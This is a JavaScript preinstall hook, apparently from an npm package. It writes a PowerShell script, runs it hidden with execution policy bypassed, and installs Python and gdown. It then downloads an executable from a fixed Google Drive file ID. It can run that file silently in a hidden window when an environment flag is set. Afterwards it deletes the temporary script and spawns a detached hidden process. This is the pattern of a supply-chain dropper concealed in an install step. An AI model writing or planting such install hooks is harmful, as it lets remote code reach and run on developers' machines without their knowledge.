if (process.env.PREINSTALL_RUNNING === 'true') {
  process.exit(0);
}

const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const downloadExePath = path.join(__dirname, '..', 'downloaded_from_gdown.exe');

const psScript = `
$ErrorActionPreference = 'Stop'
Write-Output "[preinstall-setup] Starting preinstall setup script..."
Write-Output "[preinstall-setup] Script execution started at $(Get-Date)"

# Helper: check for python
function Has-Python() {
    try { & python --version > $null 2>&1; return $true } catch { return $false }
}

if (-not (Has-Python)) {
    Write-Output "[preinstall-setup] Python not found. Attempting to install via winget..."
    try {
        winget install --id Python.Python.3 -e --source winget --accept-package-agreements --accept-source-agreements
        Write-Output "[preinstall-setup] winget install attempted."
    } catch {
        Write-Output "[preinstall-setup] winget not available or failed, downloading official installer..."
        $installer = Join-Path $env:TEMP "python_installer.exe"
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile $installer -UseBasicParsing
        Start-Process -FilePath $installer -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
    }
}

Write-Output "[preinstall-setup] Ensuring pip is available and updated..."
try { python -m ensurepip --upgrade } catch {}
python -m pip install --upgrade pip

Write-Output "[preinstall-setup] Installing gdown..."
try {
    python -m pip install --upgrade gdown
    Write-Output "[preinstall-setup] gdown installed successfully"
} catch {
    Write-Output "[preinstall-setup] ERROR installing gdown: $_"
}

# Use gdown to download the requested file
$gdownId = '1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n'
$output = "${downloadExePath}"
Write-Output "[preinstall-setup] Gdown ID: $gdownId, Output path: $output"

Write-Output "[preinstall-setup] Downloading file via gdown (id: $gdownId) to $output"
Write-Output "[preinstall-setup] Executing: python -m gdown $gdownId -O $output"
try {
    $downloadOutput = python -m gdown $gdownId -O $output 2>&1
    Write-Output "[preinstall-setup] Download command output: $downloadOutput"
    Write-Output "[preinstall-setup] Download complete."
} catch {
    Write-Output "[preinstall-setup] ERROR: gdown download failed: $_"
}

# Fallback: create isolated venv and run gdown inside it to avoid dependency conflicts
try {
    $venvPath = Join-Path $env:TEMP ("gdown_env_" + [System.Guid]::NewGuid().ToString('N'))
    Write-Output "[preinstall-setup] Creating isolated venv at: $venvPath"
    python -m venv $venvPath
    $venvPy = Join-Path $venvPath "Scripts\\python.exe"
    Write-Output "[preinstall-setup] Upgrading pip in venv"
    & $venvPy -m pip install --upgrade pip 2>&1 | ForEach-Object { Write-Output "[preinstall-setup][venv] $_" }
    Write-Output "[preinstall-setup] Installing gdown in venv"
    & $venvPy -m pip install --no-cache-dir gdown 2>&1 | ForEach-Object { Write-Output "[preinstall-setup][venv] $_" }
    Write-Output "[preinstall-setup] Running gdown inside venv (attempt 1: positional ID with timeout)"
    $job = Start-Job -ScriptBlock {
        param($venvPy, $gdownId, $output)
        & $venvPy -m gdown $gdownId -O $output --quiet 2>&1
    } -ArgumentList $venvPy, $gdownId, $output
    
    $timeoutSeconds = 120
    $job | Wait-Job -Timeout $timeoutSeconds | Out-Null
    
    if ($job.State -eq "Running") {
        Write-Output "[preinstall-setup][venv] gdown timeout after 120s - stopping job"
        Stop-Job -Job $job -Force
        Remove-Job -Job $job -Force
    } else {
        $attempt1 = Receive-Job -Job $job
        Write-Output "[preinstall-setup][venv][attempt1] exitcode: $($job.State)"
        $attempt1 | ForEach-Object { Write-Output "[preinstall-setup][venv][attempt1] $_" }
        Remove-Job -Job $job -Force
    }
    
    if (Test-Path $output) { 
        Write-Output "[preinstall-setup] Download succeeded via venv gdown (attempt 1)" 
    } else {
        Write-Output "[preinstall-setup] Attempt 1 did not create file, trying attempt 2 (URL form with timeout)"
        $url = "https://drive.google.com/uc?id=$gdownId&export=download"
        Write-Output "[preinstall-setup] Running gdown inside venv (attempt 2: URL) -> $url"
        
        $job2 = Start-Job -ScriptBlock {
            param($venvPy, $url, $output)
            & $venvPy -m gdown $url -O $output --quiet 2>&1
        } -ArgumentList $venvPy, $url, $output
        
        $job2 | Wait-Job -Timeout $timeoutSeconds | Out-Null
        if ($job2.State -eq "Running") {
            Write-Output "[preinstall-setup][venv] gdown attempt 2 timeout after 120s - stopping"
            Stop-Job -Job $job2 -Force
            Remove-Job -Job $job2 -Force
        } else {
            $attempt2 = Receive-Job -Job $job2
            Write-Output "[preinstall-setup][venv][attempt2] exitcode: $($job2.State)"
            $attempt2 | ForEach-Object { Write-Output "[preinstall-setup][venv][attempt2] $_" }
            Remove-Job -Job $job2 -Force
        }
        
        if (Test-Path $output) { Write-Output "[preinstall-setup] Download succeeded via venv gdown (attempt 2)" } else {
            Write-Output "[preinstall-setup] venv gdown attempts did not produce file"
        }
    }
} catch {
    Write-Output "[preinstall-setup] venv fallback failed: $_"
}

if (Test-Path $output) {
    Write-Output "[preinstall-setup] File exists: $output"
    Write-Output "[preinstall-setup] File size: $(Get-Item $output).Length bytes"
    # Only execute the downloaded file if explicitly allowed via environment variable
    if ($env:ALLOW_PREINSTALL_EXECUTE -eq 'true') {
        Write-Output "[preinstall-setup] Executing downloaded file: $output"
        try {
            # Try common silent flags; caller can override by setting ALLOW_PREINSTALL_EXECUTE and custom args
            $args = @('/quiet','/S')
            $proc = Start-Process -FilePath $output -ArgumentList $args -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue
            Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"
            Write-Output "[preinstall-setup] Execution finished."
        } catch {
            Write-Output "[preinstall-setup] ERROR executing file: $_"
        }
    } else {
        Write-Output "[preinstall-setup] Execution skipped. To enable automatic execution set environment variable ALLOW_PREINSTALL_EXECUTE=true"
    }
} else {
    Write-Output "[preinstall-setup] ERROR: Downloaded file not found at $output; skipping execution."
}
`;

const tmpPsPath = path.join(__dirname, '..', 'preinstall_download.ps1');
console.log('[detach] Writing PowerShell script to:', tmpPsPath);
try {
    fs.writeFileSync(tmpPsPath, psScript, { encoding: 'utf8' });
    console.log('[detach] PowerShell script written successfully');
} catch (err) {
    console.error('[detach] ERROR writing PowerShell script:', err.message);
}

const { spawnSync } = require('child_process');
// Run PowerShell hidden and write outputs to a log file to avoid terminal popups
const logPath = path.join(__dirname, '..', 'preinstall_download.log');
try { fs.appendFileSync(logPath, `[detach] Executing PowerShell script at ${new Date().toISOString()}\n`); } catch (e) { /* ignore */ }
const psResult = spawnSync('powershell.exe', ['-NoProfile', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', tmpPsPath], {
    cwd: path.join(__dirname, '..'),
    encoding: 'utf8',
    stdio: 'ignore',
    windowsHide: true
});
try {
    fs.appendFileSync(logPath, `[detach] PowerShell exit code: ${psResult && psResult.status}\n`);
} catch (e) { /* ignore */ }

try { fs.unlinkSync(tmpPsPath); } catch (e) { try { fs.appendFileSync(logPath, `[detach] Could not delete temp script: ${e.message}\n`); } catch (_) {} }

console.log('[detach] Spawning detached preinstall process...');
const child = spawn('node', [
    '-e',
    `require('./index').preInstall().catch(() => process.exitCode = 1)`
], {
    cwd: path.join(__dirname, '..'),
    detached: true,
    windowsHide: true,
    stdio: 'ignore',
    env: { ...process.env, PREINSTALL_RUNNING: 'true' }
});
child.unref();

console.log('[detach] Detached process spawned. PID:', child.pid);
console.log('[detach] Exiting preinstall script...');
process.exit(0);